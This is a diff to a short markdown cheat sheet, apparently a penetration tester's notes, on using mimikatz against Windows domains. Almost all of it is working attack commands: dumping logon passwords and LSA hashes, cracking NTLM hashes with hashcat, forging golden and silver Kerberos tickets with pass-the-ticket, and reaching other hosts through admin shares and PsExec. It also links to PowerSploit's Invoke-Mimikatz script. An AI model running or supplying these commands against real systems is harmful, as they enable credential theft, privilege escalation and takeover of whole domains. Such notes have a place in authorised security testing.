@@ -1,5 +1,7 @@
 # mimikatz
 
+* [PowerShellMafia/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
+
 ## check
 
 ```bash
@@ -14,7 +16,7 @@ privilege::debug
 sekurlsa::logonpasswords
 
 # dump hashes
-lsadump::lsa /patch
+lsadump::lsa [/inject | /patch]
 # hashcat -m 1000 <hash>
 ```
 
@@ -37,15 +39,15 @@ kerberos::ptt TICKET
 # dump hash and SID
 lsadump::lsa /inject /name: [krbtgt | DOMAIN_ADMIN_ACCOUNT | SERVICE_ACCOUNT] 
 
-# create golden ticket
-kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:500
-# create silver ticket
-kerberos::golden /user:<USER> /domain:DOMAINM /sid:SID /krbtgt:SERVICE_NTLM_hash /id:1103
+# create golden ticket and pass-the-ticket
+kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:500 /ptt
+# create silver ticket and pass-the-ticket
+kerberos::golden /user:<USER> /domain:DOMAINM /sid:SID /krbtgt:SERVICE_NTLM_hash /id:1103 /ptt
 
 # check
 misc::cmd
-dir \\Desktop-1\c$ [/user:USER PASS]
-PsExec.exe \\Desktop-1 cmd.exe
+dir \\IP\c$ [/user:USER PASS]
+PsExec.exe \\IP cmd.exe
 
 ```
 
